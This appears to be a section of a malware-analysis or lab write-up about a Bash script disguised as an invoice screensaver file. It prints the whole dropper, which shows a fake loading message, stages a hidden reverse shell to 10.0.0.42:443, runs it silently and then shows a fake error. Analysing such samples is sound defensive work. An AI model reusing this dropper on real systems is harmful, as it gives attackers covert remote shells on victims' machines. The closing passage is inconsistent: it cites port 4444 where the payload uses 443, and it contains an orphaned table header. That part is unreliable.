## Phase 4: Analysing the Malware Payload

### Examining the downloaded file

```bash
o.deer@west-tech-workstation:~$ cat Downloads/invoice_payload.scr
```

The `.scr` extension is social engineering camouflage (Windows screensaver files are executable — on Linux, the extension is irrelevant but tricks users). The file is actually a **Bash script**:

### Malware behaviour breakdown

```bash
#!/bin/bash
# Step 1: Fake loading message — victim thinks invoice is opening
echo "Loading encrypted document... please wait."
sleep 2

# Step 2: Create hidden staging directory
TMP_DIR="/tmp/.westproc"
mkdir -p "$TMP_DIR"

# Step 3: Drop reverse shell payload
cat << 'PAYLOAD' > "$TMP_DIR/.syncd.sh"
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.42/443 0>&1
PAYLOAD

# Step 4: Execute silently in background
chmod +x "$TMP_DIR/.syncd.sh"
nohup "$TMP_DIR/.syncd.sh" &>/dev/null &

# Step 5: Show fake error to victim
echo "Error: Failed to load document (corrupted file)."
```

| Stage | Action | Purpose |
| ----- | ------ | ------- |
| **Social engineering** | Displays "Loading encrypted document..." | Victim believes an invoice is opening |
| **Staging** | Creates `/tmp/.westproc/` | Hidden directory for payload |
| **Payload drop** | Writes `.syncd.sh` reverse shell | Connects back to attacker at `10.0.0.42:443` |
| **Execution** | `nohup` + background process | Runs silently, survives terminal close |
| **Cover** | Displays "Failed to load document" error | Victim assumes file is corrupted, doesn't investigate |

> **Attack summary:** `invoice_payload.scr` is a disguised Bash script that establishes a reverse shell to `10.0.0.42:443` while displaying a fake document error.

| File | Size | Significance |

Port **4444** is a well-known indicator:
- Metasploit default handler port
- Common reverse shell port
- Frequently used for malware C2
